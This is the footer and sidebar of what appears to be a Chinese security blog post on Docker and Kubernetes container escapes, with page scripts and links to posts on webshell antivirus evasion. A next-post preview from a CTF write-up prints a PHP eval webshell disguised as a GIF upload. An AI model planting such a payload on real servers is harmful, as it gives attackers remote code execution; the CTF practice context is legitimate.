+https://www.cnblogs.com/tomyyyyy/p/16275873.html#tid-mkZRym
+https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Docker/Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20%28CVE-2020-15257%29%E5%A4%8D%E7%8E%B0/
+https://blog.csdn.net/qq_36197704/article/details/122172877
+https://m01ly.github.io/2022/01/04/pt-docker-escape/
+</code></pre>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://bohemian.top">bohemian</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://bohemian.top/2024/01/10/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8B/">https://bohemian.top/2024/01/10/k8s学习及漏洞复现/k8s学习及漏洞复现-下/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://bohemian.top" target="_blank">Bohemian</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/images/k8s/UzJuMarkDownImage89bb8f54fc5c96249c42867fbf9e8b88.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2023/12/25/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8A/" title="k8s学习及漏洞复现-上"><img class="cover" src="/images/k8s/UzJuMarkDownImage89bb8f54fc5c96249c42867fbf9e8b88.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">k8s学习及漏洞复现-上</div></div><div class="info-2"><div class="info-item-1">k8s基础知识常见的pod状态 pod pod常见的状态：第一阶段：挂起（Pending）：1、正在创建Pod但是Pod中的容器还没有全部被创建完成，处于此状态的Pod应该检查Pod依赖的存储是否有权限挂载、镜像是否可以下载、调度是否正常等2、我们在请求创建pod时，条件不满足，调度没有完成，没有任何一个节点能满足调度条件，已经创建了pod但是没有适合它运行的节点叫做挂起，调度没有完成。 失败（Failed）：Pod 中的所有容器都已终止了，并且至少有一个容器是因为失败终止。也就是说，容器以非0状态退出或者被系统终止。未知（Unknown）：未知状态，所谓pod是什么状态是apiserver和运行在pod节点的kubelet进行通信获取状态信息的，如果节点之上的kubelet本身出故障，那么apiserver就连不上kubelet，得不到信息了，就会看Unknown，通常是由于与pod所在的node节点通信错误。 Error 状态：Pod...</div></div></div></a><a class="pagination-related" href="/2024/01/16/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/" title="polarctfweb刷题记录2"><img class="cover" src="/images/polarctf/image-20231225150230307.png" onerror="onerror=null;src='/images/others/xingkong.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">polarctfweb刷题记录2</div></div><div class="info-2"><div class="info-item-1">webezupload文件上传，随便穿一个东西发现需要传gif，改一个 123Content-Type: image/gifGIF89A&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;  即可 自由的文件上传系统文件上传+文件包含随意传个文件，包含一下即可 代码审计1给了源码 1234567891011&lt;?phphighlight_file(__FILE__);include(&#x27;flag.php&#x27;);$sys = $_GET[&#x27;sys&#x27;];if (preg_match(&quot;|flag|&quot;, $xsx)) &#123;           die(&quot;flag is no here!&quot;);&#125; else &#123;    $xsx = $_GET[&#x27;xsx&#x27;];    echo new $sys($xsx);&#125;  当我们看到new...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/website/avatar.jpg" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="avatar"/></div><div class="author-info-name">bohemian</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Bohemiana"><i class="fab fa-github"></i><span>Go Github</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Bohemiana" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Bohemian's blog</div></div><div class="card-widget aside aside-count"><div class="item-headline"><i class="fas fa-hourglass-half"></i><span>人生倒计时</span></div><div class="item-content"><div id="life-progress" ></div> <script src="https://cdn-js.moeworld.top/gh/qxdn/life-progress@latest/autoload.min.js"></script></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-1docker-remote-api-2375"><span class="toc-number">1.</span> <span class="toc-text">1.1docker remote api (2375)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-2%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">1.2搭建本地漏洞</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-3%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">1.3利用过程</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-4%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E9%80%83%E9%80%B8"><span class="toc-number">4.</span> <span class="toc-text">1.4特权模式逃逸</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-6%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">1.6总结：</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-docker-runC%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8-CVE-2019-5736%E5%A4%8D%E7%8E%B0"><span class="toc-number"></span> <span class="toc-text">2.docker:runC容器逃逸-CVE-2019-5736复现</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#2-1%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">2.1漏洞原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-2%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="toc-number">2.</span> <span class="toc-text">2.2环境部署</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-3%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">2.3漏洞影响版本</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-4%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">2.4利用条件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-5%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">5.</span> <span class="toc-text">2.5利用过程</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-6%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">2.6总结</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-CVE-2020-15257-host%E6%A8%A1%E5%BC%8F%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number"></span> <span class="toc-text">3.CVE-2020-15257-host模式容器逃逸漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3-1%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9Adocker%E7%BD%91%E7%BB%9C-Docker%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">3.1前置知识：docker网络,Docker配置不当导致的容器逃逸</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-2containerd-shim"><span class="toc-number">2.</span> <span class="toc-text">3.2containerd-shim</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-3%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">3.3漏洞原理</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-4%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">4.</span> <span class="toc-text">3.4漏洞影响版本</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">5.</span> <span class="toc-text">3.5环境搭建</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">3.6漏洞利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%87%B4%E8%B0%A2"><span class="toc-number"></span> <span class="toc-text">致谢</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number"></span> <span class="toc-text">参考</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-6(jspx免杀)"/></a><div class="content"><a class="title" href="/2025/02/06/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/" title="哥斯拉二开从0到1-6(jspx免杀)">哥斯拉二开从0到1-6(jspx免杀)</a><time datetime="2025-02-06T02:21:52.000Z" title="发表于 2025-02-06 10:21:52">2025-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-5(asmx免杀)"/></a><div class="content"><a class="title" href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/" title="哥斯拉二开从0到1-5(asmx免杀)">哥斯拉二开从0到1-5(asmx免杀)</a><time datetime="2025-01-24T09:37:43.000Z" title="发表于 2025-01-24 17:37:43">2025-01-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-4(流量优化)"/></a><div class="content"><a class="title" href="/2025/01/22/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/" title="哥斯拉二开从0到1-4(流量优化)">哥斯拉二开从0到1-4(流量优化)</a><time datetime="2025-01-22T01:53:00.000Z" title="发表于 2025-01-22 09:53:00">2025-01-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-3(动态密钥)"/></a><div class="content"><a class="title" href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/" title="哥斯拉二开从0到1-3(动态密钥)">哥斯拉二开从0到1-3(动态密钥)</a><time datetime="2024-12-24T05:38:47.000Z" title="发表于 2024-12-24 13:38:47">2024-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="哥斯拉二开从0到1-2(免杀)"><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" onerror="this.onerror=null;this.src='/images/others/xingkong.jpg'" alt="哥斯拉二开从0到1-2(免杀)"/></a><div class="content"><a class="title" href="/2024/11/18/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/" title="哥斯拉二开从0到1-2(免杀)">哥斯拉二开从0到1-2(免杀)</a><time datetime="2024-11-18T01:55:05.000Z" title="发表于 2024-11-18 09:55:05">2024-11-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 <i id="heartbeat" class="fa fas fa-heartbeat"></i> By bohemian</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to my <a href="https://bohemian.top/">blog</a>!</div></div><head><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xindong2020/ButterflyEffects/footer/heart.css"></head></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="前往评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>(() => {
+  let initFn = window.walineFn || null
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const destroyWaline = ele => ele.destroy()
+
+  const initWaline = (Fn, el = document, path = window.location.pathname) => {
+    const waline = Fn({
+      el: el.querySelector('#waline-wrap'),
+      serverURL: 'https://waline-git-main-bohemianas-projects.vercel.app/',
+      pageview: false,
+      dark: 'html[data-theme="dark"]',
+      comment: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || path
+    })
+
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyWaline = () => {
+        destroyWaline(waline)
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+  }
+
+  const loadWaline = (el, path) => {
+    if (initFn) initWaline(initFn, el, path)
+    else {
+      btf.getCSS('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.css')
+        .then(() => import('https://cdn.jsdelivr.net/npm/@waline/client/dist/waline.min.js'))
+        .then(({ init }) => {
+          initFn = init || Waline.init
+          initWaline(initFn, el, path)
+          window.walineFn = initFn
+        })
+    }
+  }
+
+  if (isShuoshuo) {
+    'Waline' === 'Waline'
+      ? window.shuoshuoComment = { loadComment: loadWaline } 
+      : window.loadOtherComment = loadWaline
+    return
+  }
+
+  if ('Waline' === 'Waline' || !true) {
+    if (true) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
+    else setTimeout(loadWaline, 0)
+  } else {
+    window.loadOtherComment = loadWaline
+  }
+})()</script></div><div class="aplayer no-destroy" data-id="13186150757" data-server="netease" data-type="playlist" data-loop="all"  data-fixed="true" data-autoplay="true"> </div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: true,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=Bohemiana";
+            var git_color =['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];
+            var git_user ="Bohemiana";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body></html>
